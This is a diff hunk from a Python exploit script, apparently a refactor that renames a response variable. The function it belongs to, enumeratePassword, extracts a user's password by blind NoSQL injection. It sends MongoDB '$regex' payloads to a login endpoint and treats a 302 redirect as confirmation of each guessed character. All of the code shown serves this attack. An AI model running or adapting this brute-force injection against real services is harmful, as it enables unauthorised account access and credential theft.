@@ -33,12 +33,12 @@ def enumeratePassword(url, session, username, p1):
             p1.status(f"{{'username': '{username}', 'password': {{'$regex': '^{password}{regex_character}'}}}}")
             
             try:
-                r = session.post(url, json=data, allow_redirects=False, timeout=10)
+                request = session.post(url, json=data, allow_redirects=False, timeout=10)
             except requests.exceptions.RequestException as e:
                 log.error(f"Request error: {e}")
                 continue
             
-            if r.status_code == 302:
+            if request.status_code == 302:
                 password += character
                 character_found = True
                 break
